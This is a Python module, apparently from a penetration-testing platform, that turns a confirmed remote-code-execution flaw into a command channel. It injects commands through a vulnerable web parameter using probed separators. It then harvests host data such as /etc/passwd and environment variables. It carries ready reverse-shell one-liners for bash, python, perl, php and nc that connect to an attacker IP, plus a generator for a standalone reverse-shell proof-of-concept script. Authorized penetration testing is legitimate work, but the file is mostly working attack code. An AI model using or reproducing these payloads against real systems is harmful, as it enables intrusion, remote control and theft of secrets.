# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

"""Sprint 3 模块 9：Shell 通道。

在确认 RCE 漏洞后，建立命令执行通道：
- execute_command: 通过漏洞参数注入命令并获取输出
- generate_poc: 生成 reverse shell 脚本
- extract_info: 自动提取系统信息（hostname / whoami / /etc/passwd 等）

安全约束：实际命令执行仅在 --dangerous 模式下进行。
"""
from urllib.parse import urlencode

from vulnclaw.core.logger import logger
from vulnclaw.core.scanner import safe_request
from typing import Dict, List, Optional


# P1-15：命令历史上限（只保留最近 N 条）
_COMMAND_HISTORY_LIMIT = 200


async def _send_payload(url: str, session, method: str, parameter: str, payload: str):
    """按 safe_request 的真实签名 (url, session, method=...) 发送注入请求。

    safe_request 返回 (status, text, headers) 元组或 None，这里统一解包为 dict，
    屏蔽调用方对返回形态的差异。
    """
    if method.upper() == "POST":
        resp = await safe_request(
            url, session=session, method="POST", data={parameter: payload}
        )
    else:
        sep = "&" if "?" in url else "?"
        full_url = f"{url}{sep}{urlencode({parameter: payload})}"
        resp = await safe_request(full_url, session=session, method="GET")

    status, text, headers = (resp if resp else (0, "", {}))[:3]
    return {"status_code": status, "text": text, "headers": headers}


class ShellChannel:
    """RCE Shell 通道。

    通过已确认的 RCE 漏洞参数，发送命令并解析输出。
    """

    # 命令注入分隔符（按优先级排序）
    INJECT_SEPARATORS = [";", "|", "&&", "`", "$()", "%0a", "%0d%0a"]

    # 系统信息提取命令
    INFO_COMMANDS = {
        "hostname": ["hostname", "cat /etc/hostname"],
        "whoami": ["whoami", "id"],
        "os": ["uname -a", "cat /etc/os-release", "cat /proc/version"],
        "users": ["cat /etc/passwd"],
        "network": ["ifconfig", "ip addr", "cat /etc/hosts"],
        "processes": ["ps aux"],
        "cron": ["crontab -l", "cat /etc/crontab"],
        "env": ["env", "printenv"],
    }

    # reverse shell 模板
    REVERSE_SHELLS = {
        "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket();s.connect((\"{ip}\",{port}));"
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            'subprocess.call(["/bin/sh","-i"])\''
        ),
        "perl": (
            "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
            "socket(S,2,1,0);connect(S,pack_sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/sh\")'"
        ),
        "php": (
            "php -r '$sock=fsockopen(\"{ip}\",{port});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    }

    def __init__(
        self,
        target: str,
        session=None,
        timeout: int = 10,
        dangerous: bool = False,
    ):
        """初始化 Shell 通道。

        Args:
            target: 目标 URL。
            session: HTTP 会话对象。
            timeout: 单次命令执行超时（秒）。
            dangerous: 是否实际执行命令（False 时仅生成 POC）。
        """
        self.target = target
        self.session = session
        self.timeout = timeout
        self.dangerous = dangerous
        self._best_separator: Optional[str] = None
        self._command_history: List[Dict] = []

        logger.info(
            f"🖥️ [ShellChannel] 初始化: target={target} dangerous={dangerous}"
        )

    async def execute_command(
        self,
        command: str,
        finding: Dict,
    ) -> str:
        """通过 RCE 漏洞执行命令。

        Args:
            command: 要执行的命令。
            finding: 漏洞字典（包含 url / parameter / method 等）。

        Returns:
            命令输出字符串。
        """
        url = finding.get("url", self.target)
        parameter = finding.get("parameter", "cmd")
        method = finding.get("method", "GET")

        # 找到最佳分隔符
        if self._best_separator is None:
            self._best_separator = await self._find_separator(finding)

        sep = self._best_separator or ";"
        payload = f"{sep}{command}"

        logger.info(f"🖥️ [ShellChannel] 执行: {command} (sep={sep})")

        # 发送 payload
        try:
            resp = await _send_payload(url, self.session, method, parameter, payload)
            output = resp.get("text", "")

            # 记录历史
            self._command_history.append({
                "command": command,
                "payload": payload,
                "status": resp.get("status_code", 0),
                "output_length": len(output),
            })
            # P1-15：有界化（只保留最近 N 条，避免长会话无限堆积）
            if len(self._command_history) > _COMMAND_HISTORY_LIMIT:
                del self._command_history[:-_COMMAND_HISTORY_LIMIT]

            return output

        except Exception as exc:
            logger.warning(f"⚠️ [ShellChannel] 命令执行失败: {exc}")
            return ""

    async def _find_separator(self, finding: Dict) -> str:
        """自动探测最佳命令注入分隔符。

        Args:
            finding: 漏洞字典。

        Returns:
            有效的分隔符字符串。
        """
        url = finding.get("url", self.target)
        parameter = finding.get("parameter", "cmd")
        method = finding.get("method", "GET")

        # 使用 echo 命令测试
        test_str = "DEEPSEC_TEST_OK"
        for sep in self.INJECT_SEPARATORS:
            payload = f"{sep}echo {test_str}"
            try:
                resp = await _send_payload(url, self.session, method, parameter, payload)
                if test_str in resp.get("text", ""):
                    logger.info(f"🖥️ [ShellChannel] 有效分隔符: {sep}")
                    return sep
            except Exception:
                continue

        logger.warning("⚠️ [ShellChannel] 未找到有效分隔符，使用默认 ;")
        return ";"

    async def extract_info(self, finding: Dict) -> Dict:
        """自动提取目标系统信息。

        Args:
            finding: 漏洞字典。

        Returns:
            {
                "hostname": str,
                "whoami": str,
                "os": str,
                "users": str,
                "network": str,
                "processes": str,
                "env": str,
            }
        """
        if not self.dangerous:
            logger.info("ℹ️ [ShellChannel] 非 dangerous 模式，跳过系统信息提取")
            return {}

        info: Dict[str, str] = {}
        for key, commands in self.INFO_COMMANDS.items():
            for cmd in commands:
                output = await self.execute_command(cmd, finding)
                if output and len(output.strip()) > 0:
                    info[key] = output.strip()[:2000]
                    break

        logger.info(f"🖥️ [ShellChannel] 系统信息提取完成: {list(info.keys())}")
        return info

    def generate_poc(self, finding: Dict) -> str:
        """生成 reverse shell POC 脚本。

        Args:
            finding: 漏洞字典。

        Returns:
            Python POC 脚本字符串。
        """
        url = finding.get("url", self.target)
        parameter = finding.get("parameter", "cmd")
        vuln_type = finding.get("type", "RCE")

        poc = f'''#!/usr/bin/env python3
"""
RCE Shell POC
自动生成 by DeepSec ShellChannel
漏洞类型: {vuln_type}
目标: {url}
参数: {parameter}

使用方式:
  1. 在攻击机执行: nc -lvnp 4444
  2. 运行本脚本: python3 poc.py --ip YOUR_IP --port 4444
"""
import requests
import argparse
import sys

TARGET = "{url}"
PARAMETER = "{parameter}"

REVERSE_SHELLS = {{
    "bash": "bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1",
    "python": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\\\"{{ip}}\\\",{{port}}));"
        "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
        'subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\''
    ),
}}

def send_payload(payload):
    params = {{PARAMETER: payload}}
    resp = requests.get(TARGET, params=params, timeout=10)
    return resp

def execute(cmd):
    payload = ";" + cmd
    send_payload(payload)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", required=True, help="攻击者 IP")
    parser.add_argument("--port", type=int, default=4444, help="监听端口")
    parser.add_argument("--type", default="bash", choices=["bash", "python"])
    args = parser.parse_args()

    shell = REVERSE_SHELLS[args.type].format(ip=args.ip, port=args.port)
    print(f"[*] 发送 reverse shell: {{args.type}}")
    print(f"[*] 确保已运行: nc -lvnp {{args.port}}")
    execute(shell)
    print("[*] Payload 已发送")

if __name__ == "__main__":
    main()
'''
        return poc

    def generate_reverse_shell(self, ip: str, port: int, shell_type: str = "bash") -> str:
        """生成 reverse shell payload。

        Args:
            ip: 攻击者 IP。
            port: 监听端口。
            shell_type: shell 类型（bash / python / perl / php / nc）。

        Returns:
            reverse shell payload 字符串。
        """
        template = self.REVERSE_SHELLS.get(shell_type, self.REVERSE_SHELLS["bash"])
        return template.format(ip=ip, port=port)

    def get_history(self) -> List[Dict]:
        """返回命令执行历史。"""
        return self._command_history

    def get_best_separator(self) -> Optional[str]:
        """返回探测到的最佳分隔符。"""
        return self._best_separator
